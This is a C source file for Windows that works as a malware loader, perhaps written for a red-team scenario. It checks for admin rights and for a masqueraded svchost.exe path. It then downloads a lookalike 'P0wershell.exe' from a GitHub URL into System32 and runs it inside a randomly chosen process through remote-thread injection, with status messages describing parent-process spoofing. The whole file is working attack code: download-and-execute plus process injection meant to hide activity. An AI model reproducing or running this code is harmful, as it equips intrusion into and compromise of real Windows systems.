#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <urlmon.h>

BOOL WINAPI IsUserAnAdmin(void);

int main(void) {
    if (!IsUserAnAdmin())
        return 1;

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    if (lstrcmpiA(path, "C:\\Program Files\\Microsoft\\svchost.exe") != 0)
        return 1;

    printf("[+] Running in Elevated Session.\n");

    // pick a random running process as parent (not our own process)
    DWORD targetPID = 0;
    char targetName[MAX_PATH] = "";
    DWORD myPID = GetCurrentProcessId();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        DWORD pids[256];
        char names[256][MAX_PATH];
        DWORD count = 0;
        PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
        if (Process32First(snap, &pe)) {
            do {
                if (pe.th32ProcessID != myPID && pe.th32ProcessID != 0 && pe.th32ProcessID != 4 && count < 256) {
                    pids[count] = pe.th32ProcessID;
                    lstrcpynA(names[count], pe.szExeFile, MAX_PATH);
                    count++;
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
        if (count > 0) {
            srand(GetTickCount());
            DWORD idx = rand() % count;
            targetPID = pids[idx];
            lstrcpynA(targetName, names[idx], MAX_PATH);
        }
    }

    if (targetPID == 0) {
        printf("[-] No valid process found for PPID spoofing.\n");
        return 1;
    }
    printf("[+] Using %s (PID: %lu) as spoofed parent\n", targetName, targetPID);

    // download P0wershell.exe
    const char* url = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/P0wershell.exe";
    const char* outPath = "C:\\Windows\\System32\\P0wershell.exe";
    printf("[+] Downloading P0wershell.exe...\n");
    HRESULT hr = URLDownloadToFileA(NULL, url, outPath, 0, NULL);
    if (hr != S_OK) {
        printf("[-] Download failed (HRESULT: 0x%lx).\n", hr);
        return 1;
    }
    printf("[+] Download complete.\n");

    // open target process for injection
    HANDLE hTarget = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, targetPID);
    if (!hTarget) {
        printf("[-] Failed to open target process (%lu)\n", GetLastError());
        return 1;
    }
    printf("[+] Opened target process handle\n");

    // allocate memory in target for command line
    SIZE_T cmdLen = lstrlenA(outPath) + 1;
    LPVOID remoteMem = VirtualAllocEx(hTarget, NULL, cmdLen, MEM_COMMIT, PAGE_READWRITE);
    if (!remoteMem) {
        printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError());
        CloseHandle(hTarget);
        return 1;
    }

    if (!WriteProcessMemory(hTarget, remoteMem, outPath, cmdLen, NULL)) {
        printf("[-] WriteProcessMemory failed (%lu)\n", GetLastError());
        VirtualFreeEx(hTarget, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hTarget);
        return 1;
    }
    printf("[+] Written command line to target\n");

    // inject thread to call WinExec(path) inside target process
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pWinExec = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "WinExec");

    HANDLE hThread = CreateRemoteThread(hTarget, NULL, 0, pWinExec, remoteMem, 0, NULL);
    if (!hThread) {
        printf("[-] CreateRemoteThread failed (%lu)\n", GetLastError());
        VirtualFreeEx(hTarget, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hTarget);
        return 1;
    }
    printf("[+] Remote thread executing P0wershell.exe via target process\n");

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hTarget, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hTarget);

    Sleep(2000);
    return 0;
}
